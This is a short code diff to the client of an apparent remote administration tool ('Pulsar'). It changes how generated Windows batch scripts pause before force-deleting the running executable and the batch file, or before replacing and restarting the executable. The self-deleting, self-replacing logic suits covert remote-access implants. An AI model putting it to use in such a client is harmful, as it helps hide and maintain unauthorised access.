@@ -22,7 +22,7 @@ namespace Pulsar.Client.IO
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
-                "ping -n 10 localhost > nul" + "\r\n" +
+                "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "del /a /q /f " + "\"" + batchFile + "\"";
 
@@ -44,7 +44,7 @@ namespace Pulsar.Client.IO
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
-                "ping -n 10 localhost > nul" + "\r\n" +
+                "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
@@ -67,7 +67,7 @@ namespace Pulsar.Client.IO
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
-                "ping -n 10 localhost > nul" + "\r\n" +
+                "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "del /a /q /f " + "\"" + batchFile + "\"";
 
